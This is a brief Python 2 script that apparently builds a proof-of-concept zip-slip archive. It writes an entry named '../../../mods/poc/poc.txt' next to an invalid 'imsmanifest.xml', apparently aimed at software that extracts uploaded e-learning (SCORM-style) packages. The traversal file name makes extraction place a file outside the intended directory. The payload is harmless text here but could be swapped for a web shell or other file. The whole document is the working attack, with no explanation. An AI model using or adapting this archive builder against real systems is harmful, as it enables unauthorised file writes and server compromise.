import zipfile
from cStringIO import StringIO

def build_zip():
	f =StringIO()
	z = zipfile.ZipFile(f,'w',zipfile.ZIP_DEFLATED)
	z.writestr('../../../mods/poc/poc.txt', ' SOME TEXT HERE :) ')
	z.writestr('imsmanifest.xml','invalid xml ')
	z.close()
	zip = open('poc.zip','wb')
	zip.write(f.getvalue())
	zip.close()
	
	
build_zip()
